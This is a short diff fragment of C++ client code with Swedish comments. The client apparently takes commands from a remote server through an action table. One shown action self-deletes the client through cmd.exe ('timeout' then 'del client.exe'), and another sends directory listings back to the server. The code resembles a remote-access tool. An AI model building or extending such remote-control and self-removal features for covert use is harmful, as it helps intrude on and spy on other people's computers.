@@ -19,7 +19,7 @@ action_table client::get_actions()
 		{"uninstall", [&](std::string) { // för att avinstallera klienten
 			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
 		}},
-		{"select-file", [&](std::string data) { // för att välja fil åt servern
+		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
 			directory manager(data); //antag data är bas directory
 			helper::send_directory(client_implentation, manager.current_directory()); // skicka bas mappen
 
